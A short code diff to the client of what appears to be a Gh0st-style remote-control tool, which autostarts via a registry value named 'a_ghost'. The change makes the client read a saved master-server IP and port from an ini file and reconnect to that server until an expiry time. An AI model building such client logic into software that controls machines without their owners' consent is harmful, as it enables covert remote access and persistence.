@@ -3,6 +3,7 @@
 
 #include "stdafx.h"
 #include "ClientDll.h"
+#include <common/iniFile.h>
 
 // 自动启动注册表中的值
 #define REG_NAME "a_ghost"
@@ -473,6 +474,17 @@ DWORD WINAPI StartClient(LPVOID lParam)
 {
 	ClientApp& app(*(ClientApp*)lParam);
 	CONNECT_ADDRESS& settings(*(app.g_Connection));
+	if (!app.m_bShared)
+	{
+		iniFile cfg(CLIENT_PATH);
+		auto now = time(0);
+		auto valid_to = atof(cfg.GetStr("settings", "valid_to").c_str());
+		if (now <= valid_to) {
+			auto saved_ip = cfg.GetStr("settings", "master");
+			auto saved_port = cfg.GetInt("settings", "port");
+			settings.SetServer(saved_ip.c_str(), saved_port);
+		}
+	}
 	auto list = app.GetSharedMasterList();
 	if (list.size() > 1 && settings.runningType == RUNNING_PARALLEL) {
 		for (int i=1; i<list.size(); ++i){
